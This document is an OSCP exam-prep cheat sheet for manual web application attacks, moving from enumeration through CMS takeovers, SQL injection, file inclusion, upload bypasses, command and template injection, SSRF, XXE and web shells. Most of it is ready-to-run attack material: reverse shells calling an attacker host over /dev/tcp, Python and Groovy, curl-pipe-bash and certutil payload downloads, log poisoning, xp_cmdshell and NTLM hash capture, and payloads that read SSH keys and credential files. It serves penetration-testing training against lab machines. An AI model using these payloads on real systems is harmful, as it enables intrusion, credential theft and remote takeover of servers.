# OSCP WEB APPLICATION ATTACK BIBLE

```
Your weakest area. This document fixes that.
Every attack includes: what to look for, what to run, example requests.
No sqlmap. Everything is manual.
```

---

## STEP 1 — WEB ENUMERATION CHECKLIST (First 10 Minutes)

When you see port 80, 443, 8080, 8443, or any HTTP service, do ALL of this:

### 1A. Visit the Site Like a Human First
```
Open the site in Firefox. Do NOT jump to tools yet. Spend 2-3 minutes:

□ Read every word on every page — clues are often in plain sight
□ Check footer/header for software name and version number
□ Look for "Powered by X" or "Built with Y" text
□ Look at the URL structure — does it use parameters? (?id=, ?page=, ?file=)
□ View page source (Ctrl+U) on every page — look for:
    - HTML comments: <!-- admin password: ... --> or <!-- TODO: remove debug -->
    - Hidden form fields: <input type="hidden" name="role" value="user">
    - JavaScript files with API endpoints or hardcoded keys
    - Paths to other pages/directories you haven't seen
□ Check /robots.txt — often reveals hidden directories
□ Check /sitemap.xml — full map of the site
□ Check /.well-known/ — security.txt, openid-configuration
□ Check response headers in Burp or curl -v:
    - Server: Apache/2.4.49 ← specific version = searchsploit it
    - X-Powered-By: PHP/8.1.0-dev ← specific version = check for backdoor
    - Set-Cookie: JSESSIONID ← Java app (Tomcat, Jenkins?)
    - Set-Cookie: PHPSESSID ← PHP app
```

### 1B. Technology Fingerprinting
```bash
# What is this site running?
whatweb http://$IP
# Output tells you: CMS, language, framework, server, version numbers

# Wappalyzer (browser extension) also helps — but whatweb is faster on exam day
```

### 1C. Directory and File Brute-Forcing
```bash
# PRIMARY SCAN — run immediately, medium wordlist + common extensions
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak,zip,asp,aspx,jsp,old,conf -t 50 -o gobuster.txt

# If gobuster finds nothing interesting, try raft wordlists:
feroxbuster -u http://$IP \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,txt,html -o ferox.txt

# Don't forget HTTPS if 443 is open (different content sometimes!)
gobuster dir -u https://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html -t 50 -k

# IIS-specific extensions
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x asp,aspx,config,txt,html -t 50

# Look for backup/sensitive files specifically
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 50
```

**What you're looking for in the results:**
```
/admin/          → admin panel — try default creds
/login/          → login form — try default creds, then SQLi
/upload/         → file upload — try webshell
/api/            → API — test for IDOR, auth bypass, info disclosure
/config/         → configuration files — may contain creds
/backup/         → backup files — download everything
/.git/           → exposed git repo — dump it
/phpmyadmin/     → database admin — try root:(blank)
/manager/        → Tomcat manager — try tomcat:s3cret
/wp-admin/       → WordPress — wpscan it
/console/        → debug console (Werkzeug, H2, Jenkins Groovy)
/actuator/       → Spring Boot — check /actuator/env for secrets
.bak files       → backup of source code — read for hardcoded creds
.old files       → old version of a page — may have debug info
.zip files       → compressed archives — download and examine
```

### 1D. Virtual Host / Subdomain Discovery
```bash
# Only works if the site uses a domain name (check nmap output or page source)
# Add the domain to /etc/hosts first: echo "$IP domain.htb" >> /etc/hosts

gobuster vhost -u http://domain.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain

# Or with ffuf (can filter by size to remove false positives)
ffuf -u http://domain.htb -H "Host: FUZZ.domain.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 0    # filter out empty responses (adjust size as needed)

# Add any discovered subdomains to /etc/hosts and enumerate them separately!
```

**When to vhost scan:** If the site says "Welcome to domain.htb" or you see a domain name in SSL cert, nmap scripts, page source, or email addresses.

### 1E. Check for Exposed Git Repository
```bash
# Quick check
curl -s http://$IP/.git/HEAD
# If it returns: ref: refs/heads/main (or master) → repo is exposed!

# Dump the entire repo
python3 git-dumper.py http://$IP/.git/ ./git-output

# Then examine for creds
cd git-output
git log --oneline
git log -p    # show diffs — passwords often in old commits
git show <commit-hash>
grep -ri password .
grep -ri secret .
grep -ri key .
```
**Machines that used this:** Pilgrimage (ImageMagick CVE via git source), Busqueda (.git/config had Gitea creds), Editorial (git log had creds)

---

## STEP 2 — CMS IDENTIFICATION AND ATTACK

### WordPress
```bash
# Detect: look for /wp-login.php, /wp-admin/, /wp-content/, "WordPress" in source

# Full enumeration
wpscan --url http://$IP/wp --enumerate ap,at,u --api-token $WPSCAN_TOKEN

# What wpscan tells you:
# - WordPress version → searchsploit
# - Theme name + version → searchsploit
# - Plugin name + version → searchsploit (MOST COMMON WP VECTOR)
# - Usernames → use for brute force

# Default cred attempts
admin:admin
admin:password
admin:<machinename>

# If you get admin access:
# Appearance → Theme Editor → select 404.php → replace with PHP reverse shell
# Visit: http://$IP/wp-content/themes/<theme-name>/404.php → shell pops

# Brute force (if no lockout policy)
wpscan --url http://$IP/wp --usernames admin --passwords /usr/share/wordlists/rockyou.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
```
**Machines:** Tartarsauce (plugin RFI), Nibbles (Nibbleblog upload), Readys, Nukem

### Tomcat
```bash
# Detect: port 8080, "Apache Tomcat" page, /manager/html returns 401

# Default credentials to try at /manager/html
tomcat:s3cret        # THIS IS THE MOST COMMON ONE (Jerry HTB)
tomcat:tomcat
admin:admin
admin:password
admin:tomcat
role1:tomcat

# If creds work → deploy WAR reverse shell
msfvenom -p java/shell_reverse_tcp LHOST=$KALI LPORT=443 -f war -o shell.war

# Deploy via web UI: Upload shell.war at /manager/html

# Deploy via curl (text manager — works even if HTML manager is blocked)
curl -u 'tomcat:s3cret' --upload-file shell.war \
  "http://$IP:8080/manager/text/deploy?path=/shell"

# Trigger the shell
curl http://$IP:8080/shell/

# If you can't find creds for manager, check for LFI to read:
# /conf/tomcat-users.xml (Tabby machine used LFI → tomcat creds)
```
**Machines:** Jerry (s3cret), Tabby (LFI → config), your a practice attempt AD (user:user on Tomcat)

### Jenkins
```bash
# Detect: port 8080, "Dashboard [Jenkins]" title, Jetty in server header

# Check unauthenticated access to:
http://$IP:8080/script          # Groovy console (admin only — instant RCE)
http://$IP:8080/manage          # Management panel
http://$IP:8080/signup          # Self-registration (free admin account!)
http://$IP:8080/asynchPeople/   # User enumeration

# Default creds
admin:admin
admin:password
admin:jenkins
jenkins:jenkins

# Groovy console RCE (Linux)
String host="$KALI";int port=443;String cmd="/bin/bash";
Socket s=new Socket(host,port);Process p=[cmd].execute();
def is=p.inputStream,os=p.outputStream,err=p.errorStream;
Thread.start{while((b=is.read())!=-1)s.outputStream.write(b)};
s.inputStream.eachLine{p.outputStream.write((it+"\n").bytes);p.outputStream.flush()};s.close()

# Groovy console RCE (Windows)
def cmd = "cmd.exe /c certutil -urlcache -f http://$KALI/nc.exe C:\\Users\\Public\\nc.exe".execute()
cmd.waitFor()
def cmd2 = "cmd.exe /c C:\\Users\\Public\\nc.exe $KALI 443 -e cmd.exe".execute()

# Build step RCE (if no Groovy console access)
# Create new job → Configure → Add Build Step → Execute shell/batch
# Linux: bash -i >& /dev/tcp/$KALI/443 0>&1
# Windows: powershell -e <BASE64>

# Jenkins CLI file read (CVE-2024-23897)
wget http://$IP:8080/jnlpJars/jenkins-cli.jar
java -jar jenkins-cli.jar -s http://$IP:8080 who-am-i @/etc/passwd
java -jar jenkins-cli.jar -s http://$IP:8080 who-am-i @/var/lib/jenkins/secrets/master.key

# Extract stored credentials from Jenkins post-exploit
# Find: credentials.xml, secrets/master.key, secrets/hudson.util.Secret
# Decrypt: python3 jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml
```
**Machines:** Jeeves, Builder, plus legendary AD sets

### Joomla
```bash
# Detect: /administrator login page, "Joomla" in source

joomscan -u http://$IP

# CVE-2023-23752 — unauthenticated info disclosure (Devvortex)
# This leaks database credentials!
curl -s http://$IP/api/index.php/v1/config/application?public=true | python3 -m json.tool
# Look for "password" and "user" fields in the output

# With admin access:
# Extensions → Templates → Select template → Edit index.php → insert PHP shell
```

### Drupal
```bash
# Detect: /node/1, /user/login, CHANGELOG.txt, "Drupal" in source/headers

droopescan scan drupal -u http://$IP

# Check version
curl -s http://$IP/CHANGELOG.txt | head -5

# Drupalgeddon2 (CVE-2018-7600) — versions < 8.5.1
# Drupalgeddon3 (CVE-2018-7602) — needs auth
searchsploit drupal
```

---

## STEP 3 — SQL INJECTION (Manual, No SQLMap)

### How to Spot It

SQL injection exists when user input is inserted directly into a SQL query. Look for:
- **Login forms** — username and password fields
- **Search boxes** — search terms that query a database
- **URL parameters** — `?id=1`, `?page=products`, `?category=3`
- **Cookie values** — session tokens or tracking IDs
- **HTTP headers** — User-Agent, Referer (rare but happens)
- **API parameters** — JSON body fields in POST requests

### 3A. Detection — Test Every Input

Try each of these on every input you find. You're looking for error messages or behavior changes:

```
'                          ← Single quote. If this causes an error, you have SQLi.
"                          ← Double quote variant
' OR 1=1-- -               ← Boolean true. Does the page show all results or bypass auth?
' OR 1=1#                  ← MySQL comment variant
' AND 1=2-- -              ← Boolean false. Does the page show nothing? (compare with 1=1)
' AND SLEEP(5)-- -         ← Time-based. Does the page take 5+ seconds to load?
```

**Example — Testing a login form in Burp:**
```
POST /login HTTP/1.1
Host: 10.10.10.100
Content-Type: application/x-www-form-urlencoded

username=admin' OR 1=1-- -&password=anything
```
If you get logged in, the backend query was something like:
`SELECT * FROM users WHERE username='admin' OR 1=1-- -' AND password='anything'`
The `-- -` comments out the password check.

**Example — Testing a URL parameter:**
```
# Normal request
http://10.10.10.100/products?id=1

# Test with single quote
http://10.10.10.100/products?id=1'
# If error → SQLi confirmed

# Boolean test
http://10.10.10.100/products?id=1 AND 1=1-- -     ← page loads normally
http://10.10.10.100/products?id=1 AND 1=2-- -     ← page is different/empty
# Different behavior = blind boolean SQLi
```

### 3B. UNION-Based Extraction (When You Can See Output)

This is the bread and butter. You inject a UNION SELECT to pull data from other tables.

**Step 1 — Find the number of columns:**
```
http://10.10.10.100/products?id=1 ORDER BY 1-- -     ← works
http://10.10.10.100/products?id=1 ORDER BY 2-- -     ← works
http://10.10.10.100/products?id=1 ORDER BY 3-- -     ← works
http://10.10.10.100/products?id=1 ORDER BY 4-- -     ← works
http://10.10.10.100/products?id=1 ORDER BY 5-- -     ← ERROR!
# Table has 4 columns
```

**Step 2 — Find which columns display on the page:**
```
http://10.10.10.100/products?id=-1 UNION SELECT 1,2,3,4-- -
# Use id=-1 (non-existent) so only your injected row shows
# If "2" and "3" appear on the page, those are your output columns
```

**Step 3 — Extract database info through the visible columns:**
```
# Current database and user
?id=-1 UNION SELECT 1,database(),user(),4-- -

# List all databases
?id=-1 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata-- -

# List tables in current database
?id=-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -

# List columns in the 'users' table
?id=-1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -

# Dump usernames and passwords
?id=-1 UNION SELECT 1,group_concat(username,':',password),3,4 FROM users-- -
```

**Example full Burp request for POST-based SQLi:**
```
POST /search HTTP/1.1
Host: 10.10.10.100
Content-Type: application/x-www-form-urlencoded

query=-1' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

### 3C. Blind Boolean Extraction (When You See No Output)

The page doesn't show query results, but behaves differently for true/false conditions. You extract data one character at a time.

```
# Does the first character of the database name = 'a'?
?id=1 AND SUBSTRING(database(),1,1)='a'-- -     ← page normal? then first char = 'a'
?id=1 AND SUBSTRING(database(),1,1)='b'-- -     ← page different? keep trying

# More efficient — use ASCII codes
?id=1 AND ASCII(SUBSTRING(database(),1,1))>97-- -    ← binary search: is it > 'a'?
?id=1 AND ASCII(SUBSTRING(database(),1,1))>109-- -   ← is it > 'm'?
# Narrow down until you find the exact character, then move to position 2, 3, etc.

# Extract password character by character
?id=1 AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a'-- -
```

### 3D. Time-Based Blind (When Page Looks Identical Either Way)

```
# MySQL
?id=1 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)-- -
# If page takes 3+ seconds → first char is 'a'

# PostgreSQL
?id=1; SELECT CASE WHEN SUBSTRING(current_database(),1,1)='a' THEN pg_sleep(3) ELSE pg_sleep(0) END-- -

# MSSQL
?id=1; IF (SUBSTRING(DB_NAME(),1,1)='a') WAITFOR DELAY '0:0:3'-- -
```

### 3E. SQLi → RCE (The Goal)

**MySQL → write a webshell:**
```
?id=-1 UNION SELECT 1,"<?php system($_GET['cmd']);?>",3,4 INTO OUTFILE "/var/www/html/shell.php"-- -

# Then visit:
http://10.10.10.100/shell.php?cmd=id
http://10.10.10.100/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$KALI/443+0>%261'
```

**MSSQL → enable xp_cmdshell:**
```
# In a stacked query context (use ; to separate)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'whoami';-- -
'; EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4A...';-- -

# MSSQL NTLM theft (start responder first: sudo responder -I tun0)
'; EXEC xp_dirtree '\\$KALI\share';-- -
# Responder catches NTLMv2 hash → crack with hashcat -m 5600
```

**PostgreSQL → RCE via COPY:**
```
'; CREATE TABLE cmd_output(output text);
  COPY cmd_output FROM PROGRAM 'id';
  SELECT * FROM cmd_output;-- -
```

---

## STEP 4 — LOCAL FILE INCLUSION (LFI)

### How to Spot It

LFI happens when the app includes a file based on user input. Look for:
- URL parameters with file-like values: `?page=about`, `?file=report.pdf`, `?lang=en`
- Parameters that could be paths: `?template=`, `?include=`, `?view=`, `?doc=`
- Any parameter where changing the value changes the page content

### 4A. Confirm LFI

```
# Linux targets — try to read /etc/passwd
http://10.10.10.100/index.php?page=../../../etc/passwd
http://10.10.10.100/index.php?page=....//....//....//etc/passwd          ← bypass ../ filter
http://10.10.10.100/index.php?page=..%2f..%2f..%2f..%2fetc/passwd       ← URL encode
http://10.10.10.100/index.php?page=/etc/passwd                           ← absolute path
http://10.10.10.100/index.php?page=/../../../etc/passwd%00               ← null byte (old PHP)

# Windows targets
http://10.10.10.100/index.php?page=..\..\..\..\windows\system32\drivers\etc\hosts
http://10.10.10.100/index.php?page=C:\windows\win.ini
```

### 4B. Read Valuable Files

Once you confirm LFI, read everything useful:

```
# Linux — credential files
/etc/passwd                          ← user enumeration
/etc/shadow                          ← password hashes (usually not readable, but try!)
/home/<user>/.ssh/id_rsa             ← SSH private key → instant shell
/home/<user>/.bash_history           ← commands with passwords
/var/www/html/config.php             ← database credentials
/var/www/html/wp-config.php          ← WordPress DB creds
/opt/<app>/config.yml                ← application secrets
/proc/self/environ                   ← environment variables (may have secrets)

# Windows — credential files
C:\Windows\Panther\Unattend.xml      ← setup passwords (base64)
C:\inetpub\wwwroot\web.config        ← IIS connection strings
C:\xampp\apache\conf\httpd.conf      ← Apache config
C:\Users\<user>\.ssh\id_rsa          ← SSH keys
```

### 4C. PHP Wrappers (Read Source Code)

If the app uses PHP `include()`, you can use PHP wrappers to read the source of PHP files (which would normally execute instead of display):

```
# Base64 encode the file contents so PHP doesn't execute it
http://10.10.10.100/index.php?page=php://filter/convert.base64-encode/resource=config.php

# Decode on Kali:
echo "PD9waHAKJGRiX3VzZXI..." | base64 -d
# Now you can read hardcoded database credentials, API keys, etc.

# Read index.php itself (see how the include works for further exploitation)
?page=php://filter/convert.base64-encode/resource=index.php
```

### 4D. LFI → RCE via Log Poisoning

If you can read log files via LFI, you can inject PHP code into them and execute it.

**Apache access log poisoning:**
```bash
# Step 1: Inject PHP into your User-Agent header (this gets written to the access log)
curl -A '<?php system($_GET["cmd"]); ?>' http://10.10.10.100/

# Or with nc for more control:
nc 10.10.10.100 80
GET / HTTP/1.1
Host: 10.10.10.100
User-Agent: <?php system($_GET["cmd"]); ?>

# Step 2: Include the log file via LFI and pass a command
http://10.10.10.100/index.php?page=/var/log/apache2/access.log&cmd=id

# Step 3: Get a reverse shell
http://10.10.10.100/index.php?page=/var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$KALI/443+0>%261'
```

**Common log paths to try:**
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log              ← poison via SSH: ssh '<?php system($_GET["cmd"]); ?>'@$IP
/var/log/mail.log
/var/log/vsftpd.log            ← poison via FTP login attempt
C:\xampp\apache\logs\access.log
```

### 4E. LFI → RCE via data:// Wrapper

If `allow_url_include` is enabled (rare but check):
```
# Direct code execution
http://10.10.10.100/index.php?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id

# Base64 encoded to avoid bad characters
http://10.10.10.100/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
```

### 4F. Remote File Inclusion (RFI)

If LFI works, always test RFI too. RFI includes a file from YOUR server.

```bash
# Step 1: Create a PHP shell on Kali
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Step 2: Serve it
cd /tmp && python3 -m http.server 80

# Step 3: Include it via the vulnerable parameter
http://10.10.10.100/index.php?page=http://$KALI/shell.php&cmd=id

# Step 4: Reverse shell
http://10.10.10.100/index.php?page=http://$KALI/shell.php&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$KALI/443+0>%261'
```
**Machines:** Sniper, Swagshop, Snookumsz, Slort, Tartarsauce (WP plugin RFI)

---

## STEP 5 — FILE UPLOAD ATTACKS

### How to Spot It

Any functionality that lets you upload files: profile pictures, document attachments, plugin installers, theme uploaders, ticket attachments, CMS media managers.

### 5A. Try the Simple Upload First

```bash
# Create a basic PHP webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload it through the web interface. If it works:
http://10.10.10.100/uploads/shell.php?cmd=id
```

### 5B. Bypass File Extension Filters

If `.php` is blocked, try these alternatives:
```
shell.phtml          ← often allowed
shell.pHp            ← case change
shell.php3           ← old PHP handler
shell.php4
shell.php5
shell.phar           ← PHP archive (UpDown machine used this)
shell.php.jpg        ← double extension (Networked, Usage machines)
shell.php%00.jpg     ← null byte (older PHP < 5.3.4)
shell.php%0a.jpg     ← newline injection
```

### 5C. Bypass Content-Type Checks

The server checks the Content-Type header in Burp. Change it:

```
# Original Burp request — server rejects because Content-Type says PHP
POST /upload HTTP/1.1
Host: 10.10.10.100
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php              ← CHANGE THIS

<?php system($_GET["cmd"]); ?>
------WebKitFormBoundary--

# Modified — tell the server it's an image
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg                      ← NOW IT'S "AN IMAGE"

<?php system($_GET["cmd"]); ?>
------WebKitFormBoundary--
```

### 5D. Bypass Magic Bytes Check

The server reads the first bytes of the file to check its type. Prepend image magic bytes:

```bash
# Add GIF header to your PHP shell
echo -e 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > shell.php.gif

# Or for PNG (more reliable magic bytes)
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.png.php
```

**Burp request with magic bytes + double extension + content-type bypass:**
```
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Type: image/jpeg

GIF89a;
<?php system($_GET["cmd"]); ?>
------WebKitFormBoundary--
```
**Machines:** Magic (magic bytes), Networked (double ext + magic), Nibbles (image upload)

### 5E. .htaccess Upload (Apache)

If you can upload `.htaccess`, you can make the server execute ANY extension as PHP:

```bash
# Upload this as .htaccess first:
echo 'AddType application/x-httpd-php .evil' > .htaccess
# Upload .htaccess to the upload directory

# Now upload your shell with the .evil extension:
echo '<?php system($_GET["cmd"]); ?>' > shell.evil
# Upload shell.evil

# Visit:
http://10.10.10.100/uploads/shell.evil?cmd=id
```

### 5F. web.config Upload (IIS / Windows)

For IIS servers, upload a `web.config` that executes ASP code:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified"
           requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
  <appSettings>
    <add key="cmd" value="cmd /c whoami" />
  </appSettings>
</configuration>
```
**Machines:** Bounty (web.config upload bypass on IIS)

### 5G. Find Your Upload

After uploading, you need to find where the file went:
```
/uploads/           /upload/            /files/
/images/            /img/               /media/
/attachments/       /documents/         /tmp/
/wp-content/uploads/                    /data/
/storage/app/public/

# Check gobuster output — the upload directory is often one you already found
# Check page source after uploading — sometimes the path is in the response
# Try predictable names: shell.php, <original_name>.php
```

---

## STEP 6 — COMMAND INJECTION

### How to Spot It

Command injection happens when the app runs a system command with your input. Look for:
- Features that ping, traceroute, or nslookup hosts
- DNS lookup tools, network diagnostic pages
- PDF generators, image processors, log viewers
- Any input that takes a hostname, IP, filename, or URL
- "Run," "Execute," "Check," "Test" buttons

### 6A. Test for Injection

```
# In any input field or parameter, try each separator:
; id                    ← most common — semicolon separates commands
| id                    ← pipe — feeds output to id
|| id                   ← OR — runs if previous command fails
& id                    ← background — runs both
&& id                   ← AND — runs if previous succeeds
$(id)                   ← command substitution
`id`                    ← backtick substitution
%0aid                   ← newline injection (URL-encoded \n)
```

**Example — ping functionality in Burp:**
```
POST /diagnostic HTTP/1.1
Host: 10.10.10.100
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1;id
```
If the response contains `uid=33(www-data)`, you have command injection.

### 6B. Space Filtering Bypass

Some apps filter spaces. Use these alternatives:
```
cat${IFS}/etc/passwd              ← $IFS = Internal Field Separator (space/tab)
{cat,/etc/passwd}                 ← brace expansion
cat<>/etc/passwd                  ← I/O redirection
cat%09/etc/passwd                 ← tab character (URL-encoded)
X=$'cat\x20/etc/passwd'&&$X      ← hex-encoded space
```

### 6C. Get a Reverse Shell from Command Injection
```
# URL-encode special characters when injecting via URL or form:
; bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'

# URL-encoded version (for URL parameters):
;bash+-c+'bash+-i+>%26+/dev/tcp/$KALI/443+0>%261'

# If bash is blocked, use python:
;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$KALI",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

# Blind injection? Use curl/wget to confirm, then download a shell:
;curl http://$KALI/shell.sh|bash
;wget -O /tmp/shell.sh http://$KALI/shell.sh && bash /tmp/shell.sh
```

**Machines:** Sea (log analyzer), Cozyhosting (SSH username field), Precious (pdfkit URL), Busqueda (Searchor eval)

---

## STEP 7 — SERVER-SIDE TEMPLATE INJECTION (SSTI)

### How to Spot It

SSTI happens when user input is rendered inside a template engine. Look for:
- Any place your input is reflected back on the page
- Profile pages that display your "name" or "bio"
- Email templates, greeting messages, custom error pages
- Any Python/Flask/Jinja2, Ruby/ERB, or Node.js/EJS application

### 7A. Detection — Inject Math Expressions

```
# Try each of these in any input that gets reflected on the page:
{{7*7}}            ← Jinja2/Twig — if "49" appears, confirmed SSTI
${7*7}             ← Freemarker/Velocity — if "49" appears, confirmed
<%= 7*7 %>         ← ERB (Ruby) — if "49" appears, confirmed
#{7*7}             ← Thymeleaf (Java)
{{7*'7'}}          ← Twig (PHP) — returns "7777777" (string repeat)
```

### 7B. Jinja2 RCE (Python/Flask — Most Common on OSCP)

```
# Read /etc/passwd
{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}

# Reverse shell (base64-encode the command to avoid bad chars)
# On Kali: echo -n 'bash -i >& /dev/tcp/$KALI/443 0>&1' | base64
#          Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8kS0FMSS80NDMgMD4mMQ==

{{ cycler.__init__.__globals__.os.popen('echo YmFza... | base64 -d | bash').read() }}

# Alternative payloads if first one is filtered:
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate() }}
```

---

## STEP 8 — SERVER-SIDE REQUEST FORGERY (SSRF)

### How to Spot It

SSRF happens when the app makes HTTP requests on your behalf. Look for:
- URL input fields (image from URL, webhook URLs, PDF from URL)
- Proxy/fetch functionality
- Import from URL features
- Any parameter that takes a URL value

### 8A. Scan Internal Services

```
# Point the vulnerable parameter to localhost on different ports
http://10.10.10.100/fetch?url=http://127.0.0.1:80
http://10.10.10.100/fetch?url=http://127.0.0.1:8080
http://10.10.10.100/fetch?url=http://127.0.0.1:3000
http://10.10.10.100/fetch?url=http://127.0.0.1:8443

# Fuzz internal ports with ffuf
ffuf -u "http://10.10.10.100/fetch?url=http://127.0.0.1:FUZZ" \
  -w <(seq 1 10000) -fs 0 -t 50

# Access internal admin panels
http://10.10.10.100/fetch?url=http://127.0.0.1:8080/manager/html
http://10.10.10.100/fetch?url=http://127.0.0.1:5000/admin
```
**Machines:** Editorial (internal API on 5000 leaked creds), Love (internal vote admin)

---

## STEP 9 — XXE (XML External Entity)

### How to Spot It

Any place that accepts XML input: file uploads (DOCX, SVG, XML), API endpoints with Content-Type: application/xml, SOAP services.

### 9A. Basic XXE to Read Files

```xml
<!-- Replace the normal XML content with this: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Burp request example:**
```
POST /api/submit HTTP/1.1
Host: 10.10.10.100
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<order>
  <item>&xxe;</item>
  <quantity>1</quantity>
</order>
```

**Read SSH keys for instant shell:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">
]>
<root>&xxe;</root>
```
**Machines:** Markup (XXE → SSH key → shell)

---

## STEP 10 — API TESTING

### How to Spot It

APIs are increasingly common on OSCP. Look for:
- `/api/`, `/api/v1/`, `/rest/`, `/graphql` in gobuster output
- JSON responses from endpoints
- Swagger/OpenAPI documentation at `/swagger.json`, `/api-docs`
- JavaScript files referencing API endpoints

### 10A. Enumerate the API

```bash
# Check for documentation
curl -s http://$IP/swagger.json | python3 -m json.tool
curl -s http://$IP/openapi.json | python3 -m json.tool
curl -s http://$IP/api-docs

# Fuzz API endpoints
ffuf -u http://$IP/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,201,301,403

# Try different API versions (v1 may lack auth that v2 has)
curl -s http://$IP/api/v1/admin/users
curl -s http://$IP/api/v2/admin/users
```

### 10B. IDOR (Insecure Direct Object Reference)

```bash
# Change IDs to access other users' data
curl -s http://$IP/api/user/1       ← your user
curl -s http://$IP/api/user/2       ← another user?
curl -s http://$IP/api/user/0       ← admin is often 0 or 1
curl -s http://$IP/api/user/admin   ← try username instead of ID

# Enumerate all users
for i in $(seq 1 20); do
  echo "=== User $i ==="
  curl -s http://$IP/api/user/$i
done
```

### 10C. Mass Assignment / Parameter Tampering

```bash
# When registering or updating a profile, add extra fields:
curl -s http://$IP/api/register -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"hacker123","role":"admin"}'

# Or if updating:
curl -s http://$IP/api/user/update -X PUT \
  -H "Content-Type: application/json" \
  -d '{"id":1,"role":"admin","isAdmin":true}'
```

**Practice scenario:** a target had `/backend/api/v1/dev` that leaked credentials. You found them but never tried them on WinRM/SSH. That's 20 points.

---

## STEP 11 — QUICK REFERENCE: WEB SHELLS

### PHP
```php
<?php system($_GET["cmd"]); ?>
<?php echo shell_exec($_GET["cmd"]); ?>
<?php passthru($_GET["cmd"]); ?>
```
Usage: `http://$IP/shell.php?cmd=id`

### ASPX
```
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Response.Write(Process.Start(new ProcessStartInfo("cmd","/c "+Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd()); %>
```

### JSP
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

---

## THE WEB ATTACK PRIORITY ORDER

```
When you land on a web service, work through this list in order.
Stop and exploit as soon as you find something.

1. IDENTIFY THE TECH    → whatweb, page source, headers (30 seconds)
2. SEARCHSPLOIT IT      → exact version → known CVE? (1 minute)
3. DEFAULT CREDS        → admin:admin, CMS-specific defaults (2 minutes)
4. DIRECTORY BRUTE      → gobuster/feroxbuster running in background
5. TEST EVERY INPUT     → SQLi, LFI, command injection, SSTI on every parameter
6. FILE UPLOAD          → if upload exists, try webshell with bypasses
7. API TESTING          → if /api/ found, test IDOR, auth bypass, info disclosure
8. VHOST SCAN           → if domain name known, check for hidden subdomains
9. CREDENTIAL REUSE     → try creds from other machines on this web app

NOT FINDING ANYTHING AFTER 30 MINUTES?
  → Re-run gobuster with different wordlist (raft vs dirbuster)
  → Add new extensions: -x asp,aspx,jsp,config,bak,old,zip
  → Try a bigger wordlist: directory-list-2.3-big.txt
  → Read the page content AGAIN — you probably missed a clue
```
